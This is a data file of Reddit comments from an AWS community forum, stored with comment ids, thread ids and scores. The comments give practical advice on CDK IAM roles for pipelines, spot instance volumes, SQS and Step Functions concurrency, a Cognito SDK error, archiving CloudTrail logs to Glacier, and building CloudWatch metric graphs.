g57ndxw,isayfo,"CDK works at a Stack abstraction, which is not friendly to  those Roles - since you have circular dependencies and the abstraction you need is to specify the end result, not an intermediate place where things can't be resolved.

CDK is also too low on the abstraction level for things like ECR.Source to ECS.Deploy actions. In that case, you need to bake an imageDefinitions.json and stash it in the artifacts bucket. You've got to bolt on some external ""fix"" for something that should just be an implementation detail.

\&gt; Our security team would prefer to have predefined roles and their permissions / IAM policies in a different stack for auditing purposes and easier code reviews.

Sounds a bit arbitrary? IAM Resources should probably just be audited directly? Since they can drift from CloudFormation - especially if they're being messed with to create security gaps.

As far as implementation - putting Roles in their own Stacks adds to your deploy time as well as balloons the total number of Stacks needed.  
Cross-account Pipelines require a total mess of Roles and Policies. I worked on the Pipeline implementation for [Paco](https://paco-cloud.io) and there was sooo much hair-pulling. Roles for CodePipeline, CodeBuild, ECS delegate, KMS and on and on. And once you go cross-account, the permissions needed for those Roles aren't well defined in the CodePipe docs ...

Paco takes a higher level abstraction though, so it can deal with all those issues cleanly under the hood. We're still hardening the Pipeline roles and policies created - but a couple opinions:

 \- If you declare a Pipeline set-up, the framework should make all the Roles and Policies for you. You should only need to audit that the framework Does The Right Thing (or trust someone else's audit of the code base) - and then audit actual IAM Roles/Policies to guard against malicious drift.

 \- Pipeline Roles aren't always the easiest to exploit. If your Role is tied to a Service Principal ([codepipeline.amazonaws.com](https://codepipeline.amazonaws.com)) then you generally don't have to be concerned about an exploit being performed by that Service. The exception is [codebuild.amazonaws.com](https://codebuild.amazonaws.com), since that allows your build commands to do whatever your Role allows.

Paco handles cross-account CodeCommit by using ""PollForSourceChanges = true"". It's a little more network traffic, but it's within AWS stuff so ... shrug ... it's just easier. In theory though, it's just an implementation detail, so we could later do a cross-account EventBridge set-up for cross-account CodeCommit and it wouldn't mean changing anything in the user's IaC config or code.",1.0
g56oy1s,isa9wl,"You can set spot instances to shutdown instead of terminate, that way the EBS volume won’t be destroyed. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/spot-interruptions.html#interruption-behavior

Downside is you can’t use autoscaling groups or spot fleets.",2.0
g57mtsh,isa9wl,Spot instances can be unpredictable at times. I would recommend going for EFS. Specially if reliability is a concern.,1.0
g5882e5,isa9wl,"You will have to handle spot interruption signal and attach it on your own. Or else, you can use spot orchestration solutions like [www.lightwing.io](https://www.lightwing.io).",1.0
g58zz7q,isa9wl,"Create an image with another ebs volume, don't mark the ""Delete on termination"" in the volumes page. 

&amp;#x200B;

Once you lose a spot instance, the volume will be available in the volumes page.",1.0
g570pnu,is9q5d,What’s the bottleneck for system 2? Can you have it poll SQS when it has free capacity?,5.0
g56xzfm,is9q5d,"What if you configured step functions to put a message back on the queue under failure conditions? Tradeoff is you'd have to keep track of retry count so poison messages don't block your pipeline. 

What's your volume of messages and how long does it typically take to execute the step function?",2.0
g5gvurz,is9q5d,"I know you've already ditched SQS, but, crazy idea...

1. System #1 puts messages into an SQS
2. System #2 state machine is triggered by a CloudWatch Rule matching a SUCCEED status change for the system #2 state machine AND a CloudWatch Scheduled Rule.  Having both will prevent the scenario where the step function completes, and tries to pull a new message, but there are no messages and the state machine shuts down, never to be heard from again.  If there are no messages in the SQS, then the state machine should End.
3. The state machine's first Task is a Lambda which manually pulls a single message off of the SQS and returns it to the State Machine.  Note: While Step Functions max payload now is 256k (matching SQS), payloads that max out would not allow for any additional metadata to be included as the message progresses through the state machine.
4. System #2 state machine processes the message.
5. The final Task in the system #2 state machine (after the message has been successfully processed) is a Lambda which deletes the message off the queue.
6. Repeat

This also could cause problems with timeouts and max-life, etc.  So you'd need to be sure the state machine doesn't take longer than your visibility timeout (which shouldn't be too problematic because you can delete the message even after it's become visible again) as well as max life timeouts.",2.0
g57rujw,is9q5d,"If you want to use cloudwatch events, you can setup the polling function to loop for 50 seconds (or pre-determined number if loops eg. 50 iterations with a 1s delay) and run it every minute

Just make sure your lambda time out is large enough to cover the entire time with a bit of contingency built in

The downside is that you might get a few seconds gap of no processing or overlap of the polling functions (which is why I suggest setting the expected time to run at 50s)",1.0
g570fwb,is9q5d,"I solved it by giving up on SQS altogether. Simple Queue Service was too simple, so now rabbitmq handles our messages.",0.0
g572vf3,is9q5d,"If it’s that complicated to do with Lambda and Step Functions - don’t use Lambda and step functions. If you need to limit the concurrency, Lambda + SQS is the wrong answer.  Just use Fargate if you want to stay serverless. 

No, limiting the concurrency of the Lambda is not the answer. Bad things happen. The “poller” that retrieves the messages from the queue and triggers the Lambda  will keep pulling messages and the messages will time out.",0.0
g580nd4,is8pbb,What sdk are you using?,1.0
g5a55tl,is8pbb,"If you're using raw SDK the correct function seems to be:

    cognitoidentityserviceprovider.addCustomAttributes(params)

(from [https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/CognitoIdentityServiceProvider.html#updateUserAttributes-property](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/CognitoIdentityServiceProvider.html#updateUserAttributes-property))",1.0
g5aq99u,is8pbb,"I am using amazon-cognito-identity.min.js

When I run the line 	     var cognitoidentityserviceprovider = new AWS.CognitoIdentityServiceProvider();

I get an error saying:

&amp;#x200B;

""aws-sdk-2.1.24.min.js:6 Uncaught TypeError: AWS.CognitoIdentityServiceProvider is not a constructor""

&amp;#x200B;

any thoughts? 

&amp;#x200B;

Thank you!",1.0
g5aqvnq,is8pbb,"for my user pool, I use 

 var userPool = new AmazonCognitoIdentity.CognitoUserPool(data);",1.0
g56gg1g,is8k2e,Kinesis firehose to S3. S3 lifecycle policy.,5.0
g57rcqn,is8k2e,"I wrote something to do this at a huge scale. Maybe you can adapt it to your use case. At this point, I would run it in AWS Batch instead of with SQS and ECS services. I also have an idea of how to make it stream to S3 instead of writing to a local temp file.

[Amazon S3bundler](https://github.com/amazon-archives/s3bundler) downloads billions of small S3 objects, bundles them into archives, and uploads them back into S3.

For your use case, the target bucket should have a lifecycle policy to transition to Glacier immediately or after a day or two just in case of any problems. The origin buckets should have a lifecycle policy to expire objects after their useful life. I recommend that you have S3bundler run daily to capture the last day's logs and leave the origin objects alone for enough time to regularly audit and take action if anything didn't get copied.

One of the more interesting features is that S3bundler creates manifest files you can use to audit that all objects in the origin were archived.",4.0
g57pjfz,is8k2e,"Create a scheduled ECS task (eg daily) which runs on Fargate, downloads all log files from the previous day, puts them into a single archive file and then uploads it directly to anothet S3 Bucket with Glacier storage tier.

A life cycle policy can delete the log files from the initial log bucket on a later point.",2.0
g56pahn,is8k2e,Cloudtrail logs can be stored in S3 buckets. Apply a lifecycle policy and you will have your logs in glacier.,4.0
g56w2xx,is8k2e,"I think the point of the post (as I read it anyway) is that a simple lifecycle policy to move all Cloudtrail log objects to Glacier will probably cost way more than just leaving it in the standard S3 storage class.  There’s a nice write-up of the cost considerations of moving from S3 to Glacier here: http://pragmaticnotes.com/2020/04/22/s3-to-glacier-lifecycle-transition-see-if-its-worth-it/

The short version is that for lots of small files you actually pay way more moving it to Glacier.

Unfortunately I don’t know of an obvious solution other than just some variant of what was suggested in the post (I.e. consolidate the log files and then archive them).  It would definitely be nice if there was a standardized tool for this

Edit: “move” not “love”, though loving all CloudTrail objects sounds... interesting?",10.0
g56pogt,is8k2e,"This is exactly what we do. One S3 bucket for centralized CloudTrail from all organization AWS accounts, lifecyle policy to move to Glacier and delete after our log retention period has expired. Once set up you never need to touch it again unless you actually need to retrieve something.",1.0
g5843no,is8k2e,[deleted],2.0
g58cy4p,is8k2e,"Sure, you could reduce your Glacier per-object costs by doing that, but then you would have S3 access costs + Lambda costs, which may or may not be less than the Glacier costs.

I just checked our bills and for 27TB of logs in Glacier, we are paying about $250/month for Glacier transition costs, or $3K a year. Probably not worth the cost of development time, especially since Lambda would eat into that $3K savings and add complexity.",2.0
g5asbh6,is8k2e,"It’s not just the transfer costs to consider.  If you have many small objects, it is actually more expensive to store them in Glacier than standard S3 because of the extra 32K that gets stuck on each object",3.0
g577g9o,is8k2e,Or EventBridge + Lambda?,1.0
g57k9rc,is8k2e,"I wrote this a while back. Maybe it can help you.

[https://github.com/CloudSnorkel/CloudWatch2S3](https://github.com/CloudSnorkel/CloudWatch2S3)",1.0
g55zj43,is6wd3,"Go over to the cloudwatch console, and go into ""Metrics"" and you can start building graphs based on both AWS and custom metrics:

[https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#metricsV2:graph=\~(view\~'timeSeries\~stacked\~false\~region\~'us-east-1\~stat\~'Average\~period\~300)](https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#metricsV2:graph=~(view~'timeSeries~stacked~false~region~'us-east-1~stat~'Average~period~300))

And you can build a dashboard out of these metrics as well.

Some of Amazon's docs:  
[https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/viewing\_metrics\_with\_cloudwatch.html](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/viewing_metrics_with_cloudwatch.html)  
[https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/graph\_a\_metric.html](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/graph_a_metric.html)",4.0
g56d1f9,is6wd3,Thank you so much!!!,2.0
